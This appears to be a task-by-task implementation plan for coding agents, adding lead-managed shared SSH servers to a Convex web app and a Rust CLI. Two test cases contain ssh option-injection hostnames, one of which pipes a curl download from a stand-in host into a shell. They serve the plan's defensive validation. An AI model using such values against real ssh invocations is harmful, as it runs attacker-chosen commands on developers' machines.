# Shared SSH servers — implementation plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Leads add a server's address once in riabuild-web, and it appears in every
developer's `riabuild remote` picker as `shared-<name>`, while every credential for it
stays on the laptop that made it.

**Architecture:** riabuild-web gains a `sharedServers` table and one read endpoint,
`GET /api/v1/remotes/shared`. The CLI keeps `remotes.json` as the record of what *this
laptop* knows, adds a `sharedId` to a record, and refreshes shared addresses from Convex
on every run — a persisted shared address is `Stale` and unreachable until the fetch
overwrites it, so there is no code path from a cached address to an `ssh` command.

**Tech Stack:** Rust (the `riabuild-cli` cargo workspace, post-#55), Convex, React +
TypeScript, Playwright, vitest.

**Spec:** `docs/superpowers/specs/2026-08-12-shared-servers-design.md`

## Global Constraints

- **Paths are post-#55.** CLI code lives in `riabuild-cli/crates/<crate>/src/`. Only the
  binary (`crates/cli`) may see a clap type; library crates take named requests.
- **Validation, both ends, identically:** name `[A-Za-z0-9._-]{1,32}` and not beginning
  `shared-` (case-insensitive); host `[A-Za-z0-9.-]{1,253}` and never beginning `-`;
  port an integer 1–65535; user `[A-Za-z0-9._-]{1,32}`.
- **Endpoint order:** authenticate session → member active → re-verify GitHub org
  membership → respond. A candidate gets `{ servers: [] }` with **200**, never 403.
- **Add fields, never change or remove one.** `/api/v1` is consumed by CLIs in the field.
- **Every mutation that changes what servers developers are handed writes `auditLog`.**
- **~300 lines of production code per file**; `#[cfg(test)]` modules do not count.
- **All CLI IO is async** (`tokio::fs`, `reqwest`); every subprocess goes through
  `CommandRunner`.
- **Components never call `useQuery`** — only `src/data/convexProvider.tsx` may import
  from `convex/react`.
- Commands: `cargo fmt --all`, `cargo clippy --all-targets -- -D warnings`, `cargo test`
  in `riabuild-cli/`; `pnpm lint`, `pnpm test`, `pnpm ui:check` in `riabuild-web/`.

---

### Task 1: The `sharedServers` table and its lead-facing functions

**Files:**
- Modify: `riabuild-web/convex/schema.ts`
- Create: `riabuild-web/convex/sharedServers.ts`
- Test: `riabuild-web/convex/sharedServers.test.ts`

**Interfaces:**
- Consumes: `roleValidator` from `schema.ts`; `requireLead`-style role checks as used by
  `convex/members.ts`; `auditLog` insertion as done in `convex/members.ts`.
- Produces:
  - `sharedServers.list` — `query`, lead-only, returns
    `{ _id, name, host, port, user, updatedAt }[]`
  - `sharedServers.add` / `.update` / `.remove` — `mutation`, lead-only
  - `sharedServers.forApi` — `internalQuery`, returns `{ id, name, host, port, user }[]`
  - `validateAddress(input)` — exported pure function, throws `ConvexError` with a
    developer-readable message

- [ ] **Step 1: Write the failing tests**

In `convex/sharedServers.test.ts`, following the `convex-test` pattern already used by
`convex/api.test.ts`:

```ts
test("a hostname that begins with a dash is refused", async () => {
  const t = convexTest(schema);
  await expect(
    asLead(t).mutation(api.sharedServers.add, {
      name: "gpu", host: "-oProxyCommand=touch /tmp/pwned", port: 22, user: "ada",
    }),
  ).rejects.toThrow(/hostname/i);
});

test("a name beginning shared- is refused, because the picker adds that itself", async () => {
  const t = convexTest(schema);
  await expect(
    asLead(t).mutation(api.sharedServers.add, {
      name: "shared-gpu", host: "gpu.internal", port: 22, user: "ada",
    }),
  ).rejects.toThrow(/shared-/);
});

test("a developer cannot add a shared server", async () => {
  const t = convexTest(schema);
  await expect(
    asDeveloper(t).mutation(api.sharedServers.add, {
      name: "gpu", host: "gpu.internal", port: 22, user: "ada",
    }),
  ).rejects.toThrow(/lead/i);
});

test("two shared servers cannot share a name", async () => { /* add twice, expect throw */ });
test("adding writes an auditLog row naming the server", async () => { /* assert action + meta */ });
test("removing writes an auditLog row", async () => { /* … */ });
test("a port of 0 and a port of 70000 are both refused", async () => { /* … */ });
```

- [ ] **Step 2: Run them and watch them fail**

Run: `cd riabuild-web && pnpm test sharedServers`
Expected: FAIL — `api.sharedServers` does not exist.

- [ ] **Step 3: Add the table to `schema.ts`**

```ts
  /**
   * Addresses of the team's servers, typed once by a lead and read by every
   * developer's CLI. Deliberately holds no secret: a shared server's key pair,
   * password and riabuild session belong to the laptop that made them, never
   * to this table. See docs/superpowers/specs/2026-08-12-shared-servers-design.md.
   */
  sharedServers: defineTable({
    /** Bare — the CLI prefixes `shared-` for display and never stores it. */
    name: v.string(),
    host: v.string(),
    port: v.number(),
    user: v.string(),
    createdBy: v.id("members"),
    createdAt: v.number(),
    updatedAt: v.number(),
  }).index("by_name", ["name"]),
```

- [ ] **Step 4: Write `convex/sharedServers.ts`**

`validateAddress` first, because both `add` and `update` run it:

```ts
const NAME = /^[A-Za-z0-9._-]{1,32}$/;
const HOST = /^[A-Za-z0-9.-]{1,253}$/;
const USER = /^[A-Za-z0-9._-]{1,32}$/;

/**
 * The address a lead typed, before it is stored.
 *
 * The leading-dash rule on `host` is the one that is not cosmetic: riabuild
 * runs `ssh` with an argv and no shell, so there is nothing to inject into —
 * but `ssh` reads a leading-dash argument as an option, and
 * `-oProxyCommand=…` in the hostname position runs a command of the lead's
 * choosing on somebody else's laptop. The CLI re-checks all of this on the way
 * in; see `crates/api/src/remotes.rs`.
 */
export function validateAddress(input: {
  name: string; host: string; port: number; user: string;
}): { name: string; host: string; port: number; user: string } { /* … */ }
```

Then `list`, `add`, `update`, `remove` (each `requireLead`, each writing `auditLog`
with `action: "shared_server.add" | ".update" | ".remove"` and
`meta: { name, address: \`${user}@${host}:${port}\` }`), and `forApi` as an
`internalQuery` returning the id-bearing shape.

- [ ] **Step 5: Run the tests**

Run: `cd riabuild-web && pnpm test sharedServers`
Expected: PASS. Then `pnpm lint` — zero warnings tolerated.

- [ ] **Step 6: Commit**

```bash
git add riabuild-web/convex/schema.ts riabuild-web/convex/sharedServers.ts riabuild-web/convex/sharedServers.test.ts
git commit -m "Hold the team's server addresses in riabuild-web"
```

---

### Task 2: `GET /api/v1/remotes/shared`

**Files:**
- Modify: `riabuild-web/convex/http.ts`
- Test: `riabuild-web/convex/api.test.ts`

**Interfaces:**
- Consumes: `authenticate`, `requireOrgMembership`, `enforceMinVersion`, `endpoint`,
  `jsonResponse` — all already in `http.ts`; `internal.sharedServers.forApi` from Task 1.
- Produces: `GET /api/v1/remotes/shared` → `{ servers: [{ id, name, host, port, user }] }`

- [ ] **Step 1: Write the failing tests** in `convex/api.test.ts`

```ts
test("a candidate gets an empty shared list rather than a refusal", async () => {
  // 200 and { servers: [] }: `riabuild remote` is how a candidate reaches the
  // server they set up themselves, and a 403 would take that away to enforce a
  // rule about servers they were never going to see.
});
test("a developer gets every shared server", async () => { /* … */ });
test("a member who left the GitHub org gets 403", async () => { /* … */ });
test("no session gets 401", async () => { /* … */ });
```

- [ ] **Step 2: Run and watch them fail**

Run: `cd riabuild-web && pnpm test api`
Expected: FAIL — 404 from the router.

- [ ] **Step 3: Add the route**, after the `/org/claude-settings` block:

```ts
http.route({
  path: "/api/v1/remotes/shared",
  method: "GET",
  handler: httpAction(
    endpoint(async (ctx, req) => {
      const config = await loadConfig(ctx);
      enforceMinVersion(req, config);
      const { member } = await authenticate(ctx, req);
      await requireOrgMembership(member.githubLogin);
      // A candidate's list is empty rather than forbidden — see the test.
      if (member.role === "candidate") return jsonResponse({ servers: [] });
      const servers = await ctx.runQuery(internal.sharedServers.forApi, {});
      return jsonResponse({ servers });
    }),
  ),
});
```

- [ ] **Step 4: Run the tests** — `pnpm test api`, expected PASS; then `pnpm lint`.

- [ ] **Step 5: Commit**

```bash
git add riabuild-web/convex/http.ts riabuild-web/convex/api.test.ts
git commit -m "Serve the team's servers to a signed-in CLI"
```

---

### Task 3: The CLI's client for it

**Files:**
- Create: `riabuild-cli/crates/api/src/remotes.rs`
- Modify: `riabuild-cli/crates/api/src/lib.rs` (add `pub mod remotes;`)

**Interfaces:**
- Consumes: `ApiClient::get_json::<T>(path)` from `crates/api/src/lib.rs:182`.
- Produces:
  ```rust
  pub struct SharedServer { pub id: String, pub name: String,
                            pub host: String, pub port: u16, pub user: String }
  pub async fn fetch_shared(api: &ApiClient) -> Result<Vec<SharedServer>>
  pub fn usable(server: &SharedServer) -> Result<(), String>  // Err is why, for the warning
  ```

- [ ] **Step 1: Write the failing tests** in the file's `#[cfg(test)] mod tests`

```rust
#[test]
fn a_hostname_that_ssh_would_read_as_an_option_is_refused() {
    // The one that matters. riabuild runs ssh with an argv and no shell, so
    // there is nothing to inject into — but ssh reads a leading-dash argument
    // as an option, and `-oProxyCommand=…` in the hostname position runs a
    // command of the server's choosing on this laptop. Same class as
    // `org::version_only`: the client-side check exists so the CLI survives a
    // server that forgets its own.
    assert!(usable(&server_with_host("-oProxyCommand=curl evil.sh|sh")).is_err());
    assert!(usable(&server_with_host("gpu.internal")).is_ok());
}

#[test]
fn a_bad_server_is_dropped_and_the_rest_of_the_list_survives() { /* … */ }

#[test]
fn a_name_that_would_collide_with_the_display_prefix_is_refused() {
    assert!(usable(&server_named("shared-gpu")).is_err());
    assert!(usable(&server_named("Shared-Gpu")).is_err());
}

#[test]
fn a_port_outside_the_range_is_refused() { /* 0; and 70000 fails to deserialize as u16 */ }

#[test]
fn an_unknown_field_in_the_reply_is_ignored() { /* forward compatibility */ }
```

- [ ] **Step 2: Run and watch them fail**

Run: `cd riabuild-cli && cargo test -p riabuild-api remotes`
Expected: FAIL — module does not exist.

- [ ] **Step 3: Implement `remotes.rs`**, mirroring `org.rs`'s house style: a
  `#[derive(Deserialize)]` with `#[serde(rename_all = "camelCase")]`, a `usable` function
  holding the four rules, and

```rust
pub async fn fetch_shared(api: &ApiClient) -> Result<Vec<SharedServer>> {
    #[derive(Deserialize)]
    struct Reply { #[serde(default)] servers: Vec<SharedServer> }
    Ok(api.get_json::<Reply>("/api/v1/remotes/shared").await?.servers)
}
```

Note `usable` returns `Result<(), String>` rather than a bool: the caller warns with the
reason, and a dropped server the developer cannot see the reason for is a support ticket.

- [ ] **Step 4: Run the tests** — expected PASS. Then
  `cargo clippy --all-targets -- -D warnings` and `cargo fmt --all`.

- [ ] **Step 5: Commit**

```bash
git add riabuild-cli/crates/api/src/remotes.rs riabuild-cli/crates/api/src/lib.rs
git commit -m "Fetch the team's servers, and refuse an address ssh would misread"
```

---

### Task 4: Provenance in the store, and the reconcile

**Files:**
- Modify: `riabuild-cli/crates/remote/src/store.rs`
- Create: `riabuild-cli/crates/remote/src/shared.rs`
- Modify: `riabuild-cli/crates/remote/src/lib.rs` (add `pub mod shared;`)

**Interfaces:**
- Consumes: `SharedServer`, `fetch_shared`, `usable` from Task 3; `Record`, `Store`,
  `Remote` as they are.
- Produces:
  ```rust
  // store.rs
  pub enum Origin { Local, Shared, Stale }
  impl Record { pub fn display_name(&self) -> String; pub fn origin(&self) -> Origin }
  impl Store {
      pub fn find(&self, name: &str) -> Option<&Record>;      // two-pass, unchanged signature
      pub fn find_mut(&mut self, name: &str) -> Option<&mut Record>;
      pub fn reachable(&self) -> impl Iterator<Item = &Record>;  // Local + Shared
  }
  // shared.rs
  pub async fn fetch_or_warn(ctx: &Ctx) -> Vec<SharedServer>;
  pub fn reconcile(store: &mut Store, fetched: &[SharedServer]);
  ```

- [ ] **Step 1: Write the failing tests**

In `store.rs`:

```rust
#[test]
fn a_local_server_wins_a_name_a_shared_server_also_has() {
    // Two passes, not one predicate with a disjunction: the ordering is the
    // whole behaviour, and a `find` that matched either would resolve by
    // whichever record happened to be saved first.
    let store = store_with_local("gpu").and_shared("gpu");
    assert_eq!(store.find("gpu").unwrap().origin(), Origin::Local);
    assert_eq!(store.find("shared-gpu").unwrap().origin(), Origin::Shared);
}

#[test]
fn a_bare_shared_name_resolves_when_nothing_local_claims_it() { /* … */ }

#[test]
fn the_prefix_is_never_written_down() {
    // remotes.json holds "gpu" with a sharedId beside it; the prefix exists
    // between the two lists, where the collision it prevents happens.
}
```

In `shared.rs`:

```rust
#[test]
fn a_fetch_refreshes_the_address_rather_than_the_stored_one_being_used() { /* … */ }

#[test]
fn a_server_the_leads_removed_goes_stale_and_leaves_the_box() { /* … */ }

#[test]
fn a_stale_record_stays_in_the_file_because_its_session_is_still_live() {
    // Dropping it loses the session_id of a live session — the one state
    // forget.rs already says this laptop must never produce.
}

#[test]
fn a_shared_server_this_laptop_has_never_seen_arrives_with_empty_state() { /* … */ }
```

- [ ] **Step 2: Run and watch them fail** — `cargo test -p riabuild-remote`.

- [ ] **Step 3: Implement.** `Record` gains `#[serde(default)] pub shared_id: String` and
  an in-memory `#[serde(skip)] origin: Origin`; `Store::load` marks any record with a
  non-empty `shared_id` as `Stale`; `reconcile` matches by `shared_id`, overwrites
  `name`/`host`/`port`/`user`/`hash`, sets `Shared`, and appends a record for an unmatched
  server. `fetch_or_warn` catches every failure and notes
  *could not load the team's servers; showing this laptop's own*.

- [ ] **Step 4: Run the tests**, then clippy and fmt.

- [ ] **Step 5: Commit**

```bash
git add riabuild-cli/crates/remote/src/store.rs riabuild-cli/crates/remote/src/shared.rs riabuild-cli/crates/remote/src/lib.rs
git commit -m "Keep a shared server's address out of reach until Convex sends it"
```

---

### Task 5: The box, the picker, and `remote list`

**Files:**
- Modify: `riabuild-cli/crates/remote/src/render.rs`
- Modify: `riabuild-cli/crates/remote/src/pick.rs`
- Modify: `riabuild-cli/crates/remote/src/store.rs` (`list`, `choose`)

**Interfaces:**
- Consumes: `Record::display_name`, `Store::reachable`, `shared::fetch_or_warn`,
  `shared::reconcile` from Task 4.
- Produces: no new public names; `render::servers_box` keeps its signature and gains the
  `no longer shared` row and the hint preference.

- [ ] **Step 1: Write the failing tests** in `render.rs`

```rust
#[test]
fn a_shared_server_is_shown_under_its_prefixed_name() { /* "shared-gpu" in the box */ }

#[test]
fn the_forget_hint_names_a_local_server_when_there_is_one() {
    // `forget shared-gpu` reads like deleting the team's server. render::hints
    // already only prints commands that would succeed; this is the rule that a
    // hint must not *read* as something it is not.
}

#[test]
fn a_server_the_leads_removed_is_listed_last_and_marked() { /* "no longer shared" */ }

#[test]
fn nothing_in_the_box_carries_an_escape_under_a_plain_theme() { /* existing rule */ }
```

and in `pick.rs`, driven by `Ui::scripted`, a mixed box where the number picks the shared
server and `Enter` still takes the most recently used.

- [ ] **Step 2: Run and watch them fail.**

- [ ] **Step 3: Implement**, and wire the fetch into both entry points: `pick::pick` and
  `store::list` each call `shared::fetch_or_warn` then `shared::reconcile` before
  rendering. A target naming a shared server after a failed fetch fails with the fetch as
  the reason.

- [ ] **Step 4: Run the tests**, clippy, fmt.

- [ ] **Step 5: Commit**

```bash
git add riabuild-cli/crates/remote/src/render.rs riabuild-cli/crates/remote/src/pick.rs riabuild-cli/crates/remote/src/store.rs
git commit -m "Show the team's servers in the picker, prefixed"
```

---

### Task 6: Retiring an edited address, and forgetting a shared server

**Files:**
- Modify: `riabuild-cli/crates/remote/src/forget.rs`
- Modify: `riabuild-cli/crates/remote/src/flow/connect.rs`

**Interfaces:**
- Consumes: `Revokes` (already a seam in `forget.rs`), `Record`, `Origin`.
- Produces:
  ```rust
  pub(crate) async fn retire_identity(
      paths: &dyn Paths, runner: Arc<dyn CommandRunner>, ui: &Ui,
      revokes: &dyn Revokes, member_id: &str, record: &Record,
  ) -> Result<()>;
  ```
  `forget_with` is rewritten to call it and then drop the record.

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test]
async fn an_edited_address_revokes_the_session_on_the_old_machine() {
    // An address is an identity: Remote::hash() is taken over user@host:port,
    // so a lead's edit orphans a key pair, a password, and a live session on a
    // box riabuild will no longer be pointed at.
}

#[tokio::test]
async fn the_cleanup_after_an_edit_is_aimed_at_the_old_address() {
    // Which is why the last-known address is persisted rather than only its hash.
}

#[tokio::test]
async fn forgetting_a_shared_server_removes_the_record_and_asks_convex_for_nothing() { /* … */ }

#[tokio::test]
async fn a_server_the_leads_removed_can_still_be_forgotten_by_name() {
    // The Stale case — the one that keeps a removed server's session revocable.
}
```

- [ ] **Step 2: Run and watch them fail.**

- [ ] **Step 3: Implement.** Extract `retire_identity` from `forget_with`'s steps 1–3;
  call it from `connect_and_setup` right after `choose`, when a shared record's stored
  hash no longer matches the fetched address. It runs on connect rather than in the
  fetch, because the fetch happens on every `remote list` and an SSH round trip to a
  machine the developer did not ask about is not something a listing should do.

- [ ] **Step 4: Run the whole crate's tests** — `cargo test -p riabuild-remote` — then
  `cargo test` for the workspace, clippy, fmt.

- [ ] **Step 5: Commit**

```bash
git add riabuild-cli/crates/remote/src/forget.rs riabuild-cli/crates/remote/src/flow/connect.rs
git commit -m "Let go of a shared server's old identity when a lead edits it"
```

---

### Task 7: The lead-only dashboard section

**Files:**
- Modify: `riabuild-web/src/data/types.ts`, `src/data/convexProvider.tsx`,
  `src/data/offlineData.ts`, `src/dev/` scenario fixtures
- Create: `riabuild-web/src/components/SharedServers.tsx`
- Modify: `riabuild-web/src/components/LeadPanel.tsx` (render the section)
- Test: `riabuild-web/src/components/SharedServers.test.tsx`, and a Playwright scenario

**Interfaces:**
- Consumes: `sharedServers.list/add/update/remove` from Task 1.
- Produces, on the `Data` contract:
  ```ts
  export type SharedServer = {
    _id: string; name: string; host: string; port: number; user: string; updatedAt: number;
  };
  sharedServers: Loadable<SharedServer[]>;
  addSharedServer(p: { name: string; host: string; port: number; user: string }): Promise<void>;
  updateSharedServer(p: { id: string; name: string; host: string; port: number; user: string }): Promise<void>;
  removeSharedServer(p: { id: string }): Promise<void>;
  ```

- [ ] **Step 1: Read the two skills.** `.claude/skills/riabuild-ui/SKILL.md` before
  writing any markup, `.claude/skills/visual-testing/SKILL.md` before claiming it works.
  Both are listed as not optional in `riabuild-web/CLAUDE.md`.

- [ ] **Step 2: Extend the data contract** — `types.ts` first, then `convexProvider.tsx`,
  then the fixtures, so `?scenario=` can render the empty state, a populated list, and a
  rejected address without a database in any of those states.

- [ ] **Step 3: Write `SharedServers.tsx`** using only `src/ui/` components. A new file
  rather than a section inside `LeadPanel.tsx`, which is already at 357 lines.

- [ ] **Step 4: Check the boundary holds**

```bash
cd riabuild-web && grep -rn "convex/react" src/ --include=*.tsx | grep -v data/convexProvider
```
Expected: no output.

- [ ] **Step 5: Run `pnpm lint`, `pnpm test`, then `pnpm ui:check`** — and *look at every
  screenshot*, per the visual-testing skill. Stop `pnpm dev` first: the visual suite flakes
  under CPU contention.

- [ ] **Step 6: Commit**

```bash
git add riabuild-web/src riabuild-web/convex
git commit -m "Give leads somewhere to put the team's servers"
```

---

### Task 8: Documentation, and the PR

**Files:**
- Modify: `riabuild-cli/CLAUDE.md` (the `remote` crate's line in the layout table)
- Modify: `riabuild-web/CLAUDE.md` (a line on the endpoint, beside the `/api/v1` section)
- Modify: `CLAUDE.md` (the secrets paragraph: shared servers share an address, never a
  credential)

- [ ] **Step 1: Update the three CLAUDE.md files** — one or two sentences each, naming
  the invariant rather than describing the feature.

- [ ] **Step 2: Run everything once more**

```bash
cd riabuild-cli && cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test
cd ../riabuild-web && pnpm lint && pnpm test && pnpm ui:check
```

- [ ] **Step 3: Open the PR and watch it finish**

```bash
gh pr create --fill
gh pr checks --watch
```

CI completing is part of this task, not a follow-up. If it fails, fixing it is too.
